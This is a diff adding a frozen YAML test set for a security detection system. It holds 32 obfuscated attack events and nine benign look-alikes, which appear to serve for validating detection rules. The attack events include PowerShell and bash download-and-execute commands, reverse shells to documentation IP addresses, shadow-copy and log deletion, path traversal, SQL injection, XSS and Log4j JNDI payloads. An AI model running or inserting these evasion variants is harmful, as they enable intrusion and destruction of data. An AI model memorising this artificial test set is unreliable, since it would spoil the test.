@@ -1,0 +1,553 @@
+# FROZEN previously-unseen adversarial variants (obfuscation, encoding, fragmentation) plus their benign look-alikes.
+# Written without consulting rules; do not edit (see validation/FROZEN.json).
+scenarios:
+- id: ADV-001
+  name: download method name held in a variable
+  techniques:
+  - T1059.001
+  tactic: TA0002
+  family: powershell
+  label: attack
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: srv-hr-04
+    process_name: powershell.exe
+    command_line: powershell -c "$a='Down'+'loadString'; (New-Object Net.WebClient).$a('http://203.0.113.5/x') | & ('i'+'ex')"
+- id: ADV-002
+  name: mixed-case encoded command switch
+  techniques:
+  - T1027
+  tactic: TA0005
+  family: powershell
+  label: attack
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: srv-hr-04
+    process_name: powershell.exe
+    command_line: powershell -w hidden -EnCoDeD SQBFAFgAIAAoAGkAdwByACAAaAB0AHQAcAA6AC8ALwAyADAAMwAuADAALgAxADEAMwAuADUALwB4ACkA
+- id: ADV-003
+  name: FromBase64String into iex through a variable
+  techniques:
+  - T1027
+  tactic: TA0005
+  family: powershell
+  label: attack
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: srv-hr-04
+    process_name: powershell.exe
+    command_line: powershell -nop -c "$e=[System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBFAFgAIAAoAGkAdwByACAAaAB0AHQAcAA6AC8ALwAyADAAMwAuADAALgAxADEAMwAuADUALwB4ACkA'));iex $e"
+- id: ADV-004
+  name: scriptblock created from a downloaded string
+  techniques:
+  - T1059.001
+  tactic: TA0002
+  family: powershell
+  label: attack
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: srv-hr-04
+    process_name: powershell.exe
+    command_line: powershell -nop -c "& ([scriptblock]::Create((irm http://203.0.113.5/x)))"
+- id: ADV-005
+  name: backtick-split Invoke-Expression and DownloadString
+  techniques:
+  - T1059.001
+  tactic: TA0002
+  family: powershell
+  label: attack
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: srv-hr-04
+    process_name: powershell.exe
+    command_line: powershell -c "I`E`X (New-Object Net.WebClient).Downl`oadStr`ing('http://203.0.113.5/x')"
+- id: ADV-006
+  name: format-operator assembled method name
+  techniques:
+  - T1059.001
+  tactic: TA0002
+  family: powershell
+  label: attack
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: srv-hr-04
+    process_name: powershell.exe
+    command_line: powershell -c "IEX (New-Object Net.WebClient).('{0}{1}' -f 'Download','String').Invoke('http://203.0.113.5/x')"
+- id: ADV-007
+  name: caret-obfuscated vssadmin delete
+  techniques:
+  - T1490
+  tactic: TA0040
+  family: cmd
+  label: attack
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: srv-hr-04
+    process_name: cmd.exe
+    command_line: cmd /c v^s^s^a^d^m^i^n delete shadows /all /quiet
+- id: ADV-008
+  name: COMSPEC variable instead of cmd
+  techniques:
+  - T1490
+  tactic: TA0040
+  family: cmd
+  label: attack
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: srv-hr-04
+    process_name: cmd.exe
+    command_line: '%COMSPEC% /c vssadmin delete shadows /all /quiet'
+- id: ADV-009
+  name: fully quoted tokens
+  techniques:
+  - T1490
+  tactic: TA0040
+  family: cmd
+  label: attack
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: srv-hr-04
+    process_name: vssadmin.exe
+    command_line: '"vssadmin" "delete" "shadows" "/all" "/quiet"'
+- id: ADV-010
+  name: absolute path with upper-case switches
+  techniques:
+  - T1490
+  tactic: TA0040
+  family: cmd
+  label: attack
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: srv-hr-04
+    process_name: vssadmin.exe
+    command_line: C:\Windows\System32\vssadmin.exe DELETE SHADOWS /ALL /QUIET
+- id: ADV-011
+  name: stderr redirect suffix and start /b
+  techniques:
+  - T1490
+  tactic: TA0040
+  family: cmd
+  label: attack
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: srv-hr-04
+    process_name: cmd.exe
+    command_line: cmd /c start /b vssadmin delete shadows /all /quiet 2>nul
+- id: ADV-012
+  name: wevtutil with mixed case and extra spaces
+  techniques:
+  - T1070.001
+  tactic: TA0005
+  family: cmd
+  label: attack
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: srv-hr-04
+    process_name: wevtutil.exe
+    command_line: WEVTUTIL.exe    CL    System
+- id: ADV-013
+  name: schtasks with abbreviated flags
+  techniques:
+  - T1053.005
+  tactic: TA0003
+  family: cmd
+  label: attack
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: srv-hr-04
+    process_name: schtasks.exe
+    command_line: schtasks /Create /SC ONLOGON /TN Upd /TR "powershell -w hidden -enc SQBFAFgAIAAoAGkAdwByACAAaAB0AHQAcAA6AC8ALwAyADAAMwAuADAALgAxADEAMwAuADUALwB4ACkA" /RL HIGHEST
+- id: ADV-014
+  name: quote-split bash in a reverse shell
+  techniques:
+  - T1059.004
+  tactic: TA0002
+  family: posix
+  label: attack
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: app-04
+    process_name: bash
+    command_line: b''ash -i >& /dev/tcp/203.0.113.9/4444 0>&1
+- id: ADV-015
+  name: base64 decoded and executed by command substitution
+  techniques:
+  - T1140
+  tactic: TA0005
+  family: posix
+  label: attack
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: app-04
+    process_name: bash
+    command_line: bash -c "$(echo YmFzaCAtaSA+JiAvZGV2L3RjcC8yMDMuMC4xMTMuOS80NDQ0IDA+JjE= | base64 -d)"
+- id: ADV-016
+  name: base64 piped to sh deleting logs
+  techniques:
+  - T1070.002
+  tactic: TA0005
+  family: posix
+  label: attack
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: app-04
+    process_name: sh
+    command_line: echo cm0gLXJmIC92YXIvbG9nLyo= | base64 -d | sh
+- id: ADV-017
+  name: IFS instead of spaces in curl pipe sh
+  techniques:
+  - T1105
+  tactic: TA0011
+  family: posix
+  label: attack
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: app-04
+    process_name: bash
+    command_line: curl${IFS}http://203.0.113.9/x|sh
+- id: ADV-018
+  name: backslash-split curl and sh
+  techniques:
+  - T1105
+  tactic: TA0011
+  family: posix
+  label: attack
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: app-04
+    process_name: bash
+    command_line: c\url http://203.0.113.9/x | s\h
+- id: ADV-019
+  name: eval of an echoed command
+  techniques:
+  - T1105
+  tactic: TA0011
+  family: posix
+  label: attack
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: app-04
+    process_name: bash
+    command_line: eval $(echo 'curl http://203.0.113.9/x | sh')
+- id: ADV-020
+  name: python exec of a base64 reverse shell
+  techniques:
+  - T1059.006
+  tactic: TA0002
+  family: posix
+  label: attack
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: app-04
+    process_name: python3
+    command_line: python3 -c "import base64;exec(base64.b64decode('aW1wb3J0IHNvY2tldCxvcztzPXNvY2tldC5zb2NrZXQoKTtzLmNvbm5lY3QoKCcyMDMuMC4xMTMuOScsNDQ0NCkp'))"
+- id: ADV-021
+  name: env wrapper hiding the shell in a /dev/tcp redirect
+  techniques:
+  - T1059.004
+  tactic: TA0002
+  family: posix
+  label: attack
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: app-04
+    process_name: env
+    command_line: /usr/bin/env bash -c 'exec 3<>/dev/tcp/203.0.113.9/4444; cat <&3 | sh >&3'
+- id: ADV-022
+  name: triple URL-encoded traversal
+  techniques:
+  - T1190
+  tactic: TA0001
+  family: web
+  label: attack
+  events:
+  - title: HTTP request
+    event_type: web.request
+    source_ip: 198.51.100.160
+    asset_name: web-11
+    raw_data:
+      url: /dl?f=%25252e%25252e%25252fetc%25252fpasswd
+- id: ADV-023
+  name: overlong UTF-8 slash traversal
+  techniques:
+  - T1190
+  tactic: TA0001
+  family: web
+  label: attack
+  events:
+  - title: HTTP request
+    event_type: web.request
+    source_ip: 198.51.100.160
+    asset_name: web-11
+    raw_data:
+      url: /dl?f=..%c0%af..%c0%afetc/passwd
+- id: ADV-024
+  name: nested double-dot filter bypass
+  techniques:
+  - T1190
+  tactic: TA0001
+  family: web
+  label: attack
+  events:
+  - title: HTTP request
+    event_type: web.request
+    source_ip: 198.51.100.160
+    asset_name: web-11
+    raw_data:
+      url: /dl?f=....//....//....//etc/passwd
+- id: ADV-025
+  name: SQL keywords split by comments
+  techniques:
+  - T1190
+  tactic: TA0001
+  family: web
+  label: attack
+  events:
+  - title: HTTP request
+    event_type: web.request
+    source_ip: 198.51.100.160
+    asset_name: web-11
+    raw_data:
+      url: /item?id=1 UNI/**/ON SEL/**/ECT 1,username,password FROM users
+- id: ADV-026
+  name: mixed-case SQL injection
+  techniques:
+  - T1190
+  tactic: TA0001
+  family: web
+  label: attack
+  events:
+  - title: HTTP request
+    event_type: web.request
+    source_ip: 198.51.100.160
+    asset_name: web-11
+    raw_data:
+      url: /item?id=-1 uNiOn aLl SeLeCt null,version()-- -
+- id: ADV-027
+  name: percent-encoded UNION SELECT
+  techniques:
+  - T1190
+  tactic: TA0001
+  family: web
+  label: attack
+  events:
+  - title: HTTP request
+    event_type: web.request
+    source_ip: 198.51.100.160
+    asset_name: web-11
+    raw_data:
+      url: /item?id=1%20%55NION%20%53ELECT%20NULL,user()
+- id: ADV-028
+  name: mixed-case script tag XSS
+  techniques:
+  - T1190
+  tactic: TA0001
+  family: web
+  label: attack
+  events:
+  - title: HTTP request
+    event_type: web.request
+    source_ip: 198.51.100.160
+    asset_name: web-11
+    raw_data:
+      url: /s?q=<ScRiPt>alert(document.cookie)</sCrIpT>
+- id: ADV-029
+  name: img onerror XSS
+  techniques:
+  - T1190
+  tactic: TA0001
+  family: web
+  label: attack
+  events:
+  - title: HTTP request
+    event_type: web.request
+    source_ip: 198.51.100.160
+    asset_name: web-11
+    raw_data:
+      url: /s?q=<img src=x onerror=alert(1)>
+- id: ADV-030
+  name: log4j with env default lookups
+  techniques:
+  - T1190
+  tactic: TA0001
+  family: web
+  label: attack
+  events:
+  - title: HTTP request
+    event_type: web.request
+    source_ip: 198.51.100.160
+    asset_name: web-11
+    raw_data:
+      url: /
+      user_agent: ${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//203.0.113.5/a}
+- id: ADV-031
+  name: log4j with split j-n-d-i and rmi
+  techniques:
+  - T1190
+  tactic: TA0001
+  family: web
+  label: attack
+  events:
+  - title: HTTP request
+    event_type: web.request
+    source_ip: 198.51.100.160
+    asset_name: web-11
+    raw_data:
+      url: /
+      user_agent: ${j${::-n}di:rmi://203.0.113.5/a}
+- id: ADV-032
+  name: log4j in a custom header field
+  techniques:
+  - T1190
+  tactic: TA0001
+  family: web
+  label: attack
+  events:
+  - title: HTTP request
+    event_type: web.request
+    source_ip: 198.51.100.160
+    asset_name: web-11
+    raw_data:
+      url: /api
+      x_api_version: ${${lower:j}${lower:n}${lower:d}i:ldap://203.0.113.5/a}
+- id: ADV-033
+  name: legitimate caret in a path with line continuation
+  techniques:
+  - T1059.003
+  tactic: TA0002
+  family: benign
+  label: benign
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: srv-hr-04
+    process_name: cmd.exe
+    command_line: cmd /c dir C:\Users\Public^\Documents
+- id: ADV-034
+  name: string concatenation in a harmless PowerShell greeting
+  techniques:
+  - T1059.001
+  tactic: TA0002
+  family: benign
+  label: benign
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: srv-hr-04
+    process_name: powershell.exe
+    command_line: powershell -c "Write-Host ('Hello, '+'world')"
+- id: ADV-035
+  name: format operator in a log message
+  techniques:
+  - T1059.001
+  tactic: TA0002
+  family: benign
+  label: benign
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: srv-hr-04
+    process_name: powershell.exe
+    command_line: powershell -c "'{0} files copied to {1}' -f 12, 'D:\backup'"
+- id: ADV-036
+  name: base64 in a docker login
+  techniques:
+  - T1140
+  tactic: TA0005
+  family: benign
+  label: benign
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: build-01
+    process_name: docker
+    command_line: docker login -u user --password-stdin registry.example.com
+- id: ADV-037
+  name: a long base64 token inside a curl header
+  techniques:
+  - T1105
+  tactic: TA0011
+  family: benign
+  label: benign
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: build-01
+    process_name: curl
+    command_line: 'curl -H ''Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0'' https://api.vendor.example/v1/items'
+- id: ADV-038
+  name: percent-encoded space and ampersand in a search
+  techniques:
+  - T1190
+  tactic: TA0001
+  family: benign
+  label: benign
+  events:
+  - title: HTTP request
+    event_type: web.request
+    source_ip: 198.51.100.160
+    asset_name: web-11
+    raw_data:
+      url: /search?q=black%20friday%20deals%26more&page=2
+- id: ADV-039
+  name: double-encoded percent sign in a coupon code
+  techniques:
+  - T1190
+  tactic: TA0001
+  family: benign
+  label: benign
+  events:
+  - title: HTTP request
+    event_type: web.request
+    source_ip: 198.51.100.160
+    asset_name: web-11
+    raw_data:
+      url: /cart?coupon=SAVE%2520now
+- id: ADV-040
+  name: curly-brace text in a template preview
+  techniques:
+  - T1190
+  tactic: TA0001
+  family: benign
+  label: benign
+  events:
+  - title: HTTP request
+    event_type: web.request
+    source_ip: 198.51.100.160
+    asset_name: web-11
+    raw_data:
+      url: /preview?tpl=Hello%20%7B%7Bname%7D%7D
+- id: ADV-041
+  name: environment-variable default in a deployment script
+  techniques:
+  - T1059.004
+  tactic: TA0002
+  family: benign
+  label: benign
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: build-01
+    process_name: bash
+    command_line: bash -c 'echo ${HOME:-/root} ${PORT:-8080}'
